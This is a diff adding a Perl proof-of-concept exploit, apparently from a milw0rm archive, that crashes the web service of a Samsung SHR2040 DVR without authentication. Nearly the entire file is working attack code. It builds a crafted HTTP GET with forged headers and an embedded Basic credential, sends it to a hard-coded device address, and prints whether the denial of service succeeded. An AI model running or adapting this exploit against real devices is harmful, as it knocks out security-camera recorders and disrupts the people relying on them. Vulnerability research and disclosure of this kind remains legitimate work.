@@ -1,0 +1,91 @@
+#!/usr/bin/perl -w
+#
+# Samsung DVR SHR2040 HTTPD Remote Denial of Service DoS PoC
+#
+# The vulnerability is caused due to an unspecified error in the cgis
+# files filter used for configure propierties. This can be exploited by
+# sending a specially crafted HTTP request (NO necessary authentication), 
+# which will cause the HTTP service on the system to crash.
+#
+# Requisites: Test default ports:
+#
+# PORT STATE SERVICE
+# 554/tcp open rtsp
+# 557/tcp open openvms-sysipc
+#
+# The vulnerability has been reported in versions Samsung DVR
+#
+# Firmware Version B3.03E-K1.53-V2.19_0705281908, Model = SHR2040
+#
+# More information: 	http://www.samsung.com
+#			http://www.sybsecurity.com
+#
+# Very special credits: str0ke, Kf, rathaous, !dsr, 0dd.
+#
+# and friends: nitr0us, crypkey, dex, xdawn, sirdarckcat, kuza55,
+# pikah, codebreak, h3llfyr3, canit0.
+#
+# Alex Hernandez ahernandez [at] sybsecurity dot com
+#
+
+use strict;
+use LWP;
+use Data::Dumper;
+require HTTP::Request;
+require HTTP::Headers;
+
+my $string = 	"/x";				# Strings to send
+my $method = 	'GET';				# Method "GET" or "POST"
+my $uri = 	'http://10.50.10.248:557';	# IP address:port (change this)
+my $content = 	"/test.html";			# Paths to crash
+
+#my $content = 	"/first.htm";
+#my $content = 	"/content_frame.htm?cgiName=";
+#my $content = 	"/index_menu.htm?lang=en&topMenu=";
+
+my $headers = HTTP::Headers->new(
+
+'Accept:'               => '*/*',
+'Referer:'       	=> 'http://$1$9hC8DmrL$8NG8i3pQXBabAKo.AIm8U.:12345@10.50.10.248:557',
+'Accept-Language:'     	=> 'en-us,en;q=0.5',
+'UA-CPU:'          	=> 'x86',
+'Accept-Encoding:'      => 'gzip, deflate',
+'User-Agent:'   	=> 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
+'Host:'          	=> '10.50.10.248:557',
+'Connection'          	=> 'keep-alive',
+'Authorization:'	=> 'Basic JDEkOWhDOERtckwkOE5HOGkzcFFYQmFiQUtvLkFJbThVLjoxMjM0NQ==', # base64 encode ADMIN:12345
+
+);
+
+my $request = HTTP::Request->new($method, $uri, $headers, $content, $string);
+
+my $ua = LWP::UserAgent->new;
+my $response = $ua->request($request);
+
+print "[+] Denial of Service exploit for Samsung SHR2040 Final\n";
+print "[+] Coded by: Alex Hernandez [ahernandez\@sybsecurity.com]\n";
+print "[+] We got this response from DVR: \n\n" . $response->content . "\n";
+
+my $data;
+	foreach my $pair (split('&', $response->content)) {
+ 		my ($k, $v) = split('=', $pair);
+		$data->{$k} = $v;
+}
+
+if ($data->{RESULT} != 0) {
+
+	print "[+] Denial of Service exploit for Samsung SHR2040 Final\n";
+	print "[+] Coded by: Alex Hernandez[ahernandez\@sybsecurity.com]\n";
+	print "[+] Use:\n";
+	print "\tperl -x dos_dvrsamsung.pl\n";
+ 	print $data->{RESPMSG} . "\n";
+	exit(0);
+
+} else {
+
+ 	print "[+] Denial of service Exploit successed!!!\n";
+	print "[+] By Alex Hernandez[ahernandez\@sybsecurity.com]\n";
+
+}
+
+# milw0rm.com [2008-09-07]
